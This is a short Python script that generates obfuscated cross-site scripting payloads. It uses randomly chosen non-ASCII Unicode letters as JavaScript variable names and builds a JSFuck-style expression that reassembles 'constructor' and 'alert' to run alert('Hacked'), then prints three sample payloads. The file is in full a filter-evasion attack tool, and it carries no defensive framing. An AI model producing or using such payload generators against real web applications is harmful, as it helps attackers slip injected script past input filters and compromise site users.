import random

def generate_valid_xss_payload(message="Hacked"):
    # Carefully selected Unicode ranges that work as JS variables
    unicode_ranges = [
        (0x4E00, 0x4E0F),  # CJK Unified Ideographs
        (0x3040, 0x309F),  # Hiragana
        (0x30A0, 0x30FF),  # Katakana
        (0x0370, 0x03FF),  # Greek and Coptic
        (0x0400, 0x04FF),  # Cyrillic
    ]
    
    # Collect valid characters
    valid_chars = []
    for start, end in unicode_ranges:
        for code_point in range(start, end + 1):
            char = chr(code_point)
            # Basic check for valid JS identifier
            if char.isidentifier() and not char.isascii():
                valid_chars.append(char)
    
    if len(valid_chars) < 9:
        raise ValueError("Not enough valid Unicode characters")
    
    # Select 9 unique variables
    variables = random.sample(valid_chars, 9)
    v0, v1, v2, v3, v4, v5, v6, v7, v8 = variables
    
    # Escape single quotes in the message
    message_escaped = message.replace("'", "\\'")
    
    payload = (
        f"{v0}='',{v1}=!{v0}+{v0},{v2}=!{v1}+{v0},{v3}={v0}+{{}},{v4}={v1}[{v0}++],"
        f"{v5}={v1}[{v6}={v0}],{v7}=++{v6}+{v0},{v8}={v3}[{v6}+{v7}],"
        f"{v1}[{v8}+={v3}[{v0}]+({v1}.{v2}+{v3})[{v0}]+{v2}[{v7}]+{v4}+{v5}+{v1}[{v6}]+{v8}+{v4}+{v3}[{v0}]+{v5}]"
        f"[{v8}]({v2}[{v0}]+{v2}[{v6}]+{v1}[{v7}]+{v5}+{v4}+\"('{message_escaped}')\")()"
    )
    return payload

# Test the payloads
for i in range(3):
    payload = generate_valid_xss_payload()
    print(f"Payload {i+1}:")
    print(payload)
    print()